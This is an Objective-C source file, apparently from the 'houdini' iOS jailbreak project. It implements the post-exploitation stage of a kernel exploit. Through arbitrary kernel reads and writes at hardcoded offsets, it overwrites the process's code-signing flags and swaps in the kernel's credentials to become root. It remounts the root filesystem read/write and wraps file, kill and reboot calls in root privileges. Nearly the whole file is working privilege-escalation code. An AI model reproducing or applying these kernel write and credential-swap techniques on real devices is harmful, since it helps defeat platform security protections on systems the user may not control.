//
//  empty_list_strategy.m
//  houdini
//
//  Created by Abraham Masri on 12/7/17.
//  Copyright © 2018 cheesecakeufo. All rights reserved.
//
//
#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include "strategy_control.h"
#include "empty_list_strategy.h"
#include "empty_list_sploit.h"
#include "empty_list_offsets.h"

#include "patchfinder64.h"

extern uint64_t our_proc;
extern uint64_t our_cred;
extern uint64_t kernel_base;
extern uint64_t kaslr_slide;

extern uint64_t empty_list_rk64(uint64_t kaddr);
extern uint64_t empty_list_early_rk64(uint64_t kaddr);
extern uint32_t empty_list_rk32(uint64_t kaddr);
extern uint32_t empty_list_early_rk32(uint64_t kaddr);

/*
 *  Purpose: mounts rootFS as read/write (workaround by @SparkZheng)
 */
kern_return_t empty_list_mount_rootfs() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    printf("[INFO]: kaslr_slide: %llx\n", kaslr_slide);
    printf("[INFO]: passing kernel_base: %llx\n", kernel_base);
    
    int rv = init_kernel(kernel_base, NULL);
    
    if(rv != 0) {
        printf("[ERROR]: could not initialize kernel\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    printf("[INFO]: sucessfully initialized kernel\n");
    
    char *dev_path = "/dev/disk0s1s1";
//    uint64_t dev_vnode = getVnodeAtPath(devpath);
    
    uint64_t rootvnode = find_rootvnode();
    printf("[INFO]: _rootvnode: %llx (%llx)\n", rootvnode, rootvnode - kaslr_slide);
    
    if(rootvnode == 0) {
        ret = KERN_FAILURE;
        return ret;
    }
    
    uint64_t rootfs_vnode = kread_uint64(rootvnode);
    printf("[INFO]: rootfs_vnode: %llx\n", rootfs_vnode);
    
    uint64_t v_mount = kread_uint64(rootfs_vnode + 0xd8);
    printf("[INFO]: v_mount: %llx (%llx)\n", v_mount, v_mount - kaslr_slide);
    
    uint32_t v_flag = kread_uint32(v_mount + 0x71);
    printf("[INFO]: v_flag: %x (%llx)\n", v_flag, v_flag - kaslr_slide);
    
    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
    
    
    empty_list_post_exploit(); // set our uid

    return ret;
}

// kickstarts the exploit
kern_return_t empty_list_start () {
    
    kern_return_t ret = empty_list_go();
    
    if(ret != KERN_SUCCESS)
        return KERN_FAILURE;
    
    // get kernel_task
    extern uint64_t kernel_task;
    kernel_task = empty_list_get_proc_with_pid(0, false);
    printf("kernel_task: %llx\n", kernel_task);
    
    // give ourselves power
    our_proc = empty_list_get_proc_with_pid(getpid(), false);
    uint32_t csflags = kread_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */);
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
    kwrite_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */, csflags);

    return ret;
}

// called after empty_list_start
kern_return_t empty_list_post_exploit () {
    
    kern_return_t ret = KERN_SUCCESS;
    
    if(our_proc == 0)
        our_proc = empty_list_get_proc_with_pid(getpid(), false);
    
    if(our_proc == -1) {
        printf("[ERROR]: no our proc. wut\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    extern uint64_t kernel_task;
    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    if(our_cred == 0)
        our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
    
    setuid(0);
    
    
    return ret;
}

/*
 *  Purpose: used as a workaround in iOS 11 (temp till I fix the sandbox panic issue)
 */
void empty_list_set_cred_back () {
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);
}

void empty_list_mkdir (char *path) {

    empty_list_post_exploit();
    mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    empty_list_set_cred_back();
}

void empty_list_rename (const char *old, const char *new) {

    empty_list_post_exploit();
    rename(old, new);
    empty_list_set_cred_back();
}


void empty_list_unlink (char *path) {

    empty_list_post_exploit();
    unlink(path);
    empty_list_set_cred_back();
}

int empty_list_chown (const char *path, uid_t owner, gid_t group) {
    
    empty_list_post_exploit();
    int ret = chown(path, owner, group);
    empty_list_set_cred_back();
    return ret;
}


int empty_list_chmod (const char *path, mode_t mode) {
    
    empty_list_post_exploit();
    int ret = chmod(path, mode);
    empty_list_set_cred_back();
    return ret;
}


int empty_list_open (const char *path, int oflag, mode_t mode) {
    
    empty_list_post_exploit();
    int fd = open(path, oflag, mode);
    empty_list_set_cred_back();
    
    return fd;
}

void empty_list_kill (pid_t pid, int sig) {
    
    empty_list_post_exploit();
    kill(pid, sig);
    empty_list_set_cred_back();
}


void empty_list_reboot () {
    empty_list_post_exploit();
    reboot(0);
}



void empty_list_posix_spawn (char * path) {


}


/*
 * Purpose: iterates over the procs and finds a pid with given name
 */
pid_t empty_list_pid_for_name(char *name) {
    
    extern uint64_t task_port_kaddr;
    uint64_t struct_task = empty_list_rk64(task_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));

    
    while (struct_task != 0) {
        uint64_t bsd_info = empty_list_rk64(struct_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        if(bsd_info <= 0)
            return -1; // fail!
        
        if (((bsd_info & 0xffffffffffffffff) != 0xffffffffffffffff)) {
            
            char comm[MAXCOMLEN + 1];
            kread(bsd_info + 0x268 /* KSTRUCT_OFFSET_PROC_COMM */, comm, 17);
            printf("name: %s\n", comm);
            
            if(strcmp(name, comm) == 0) {
                
                // get the process pid
                uint32_t pid = empty_list_rk32(bsd_info + empty_list_koffset(KSTRUCT_OFFSET_PROC_PID));
                return (pid_t)pid;
            }
        }
        
        struct_task = empty_list_rk64(struct_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_PREV));
        
        if(struct_task == -1)
            return -1;
    }
    return -1; // we failed :/
}




// returns the empty_list strategy with its functions
strategy _empty_list_strategy () {
    
    strategy returned_strategy;
    
    memset(&returned_strategy, 0, sizeof(returned_strategy));
    
    returned_strategy.strategy_start = &empty_list_start;
    returned_strategy.strategy_post_exploit = &empty_list_post_exploit;
    
    returned_strategy.strategy_mkdir = &empty_list_mkdir;
    returned_strategy.strategy_rename = &empty_list_rename;
    returned_strategy.strategy_unlink = &empty_list_unlink;
    
    returned_strategy.strategy_chown = &empty_list_chown;
    returned_strategy.strategy_chmod = &empty_list_chmod;
    
    returned_strategy.strategy_open = &empty_list_open;
    
    returned_strategy.strategy_kill = &empty_list_kill;
    returned_strategy.strategy_reboot = &empty_list_reboot;

//    returned_strategy.strategy_posix_spawn = &empty_list_posix_spawn;
    returned_strategy.strategy_pid_for_name = &empty_list_pid_for_name;
    
    
    return returned_strategy;
}


// custom multi_path stuff

/*
 * Purpose: iterates over the procs and finds a proc with given pid
 */
uint64_t empty_list_get_proc_with_pid(pid_t target_pid, int spawned) {

    extern uint64_t empty_list_task_port_kaddr;
    uint64_t struct_task = empty_list_rk64(empty_list_task_port_kaddr + empty_list_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));

    printf("target pid: %x\n", target_pid);
    printf("struct_task: %llx\n", struct_task);

    while (struct_task != 0) {
        uint64_t bsd_info = empty_list_rk64(struct_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));

        printf("bsd_info: %llx\n", bsd_info);
        // get the process pid
        uint32_t pid = empty_list_rk32(bsd_info + empty_list_koffset(KSTRUCT_OFFSET_PROC_PID));
        
        printf("pid: %x\n", pid);

        if(pid == target_pid) {
            return bsd_info;
        }

        if(spawned) // spawned binaries will exist AFTER our task
            struct_task = empty_list_rk64(struct_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_NEXT));
        else
            struct_task = empty_list_rk64(struct_task + empty_list_koffset(KSTRUCT_OFFSET_TASK_PREV));

    }
    return -1; // we failed :/
}

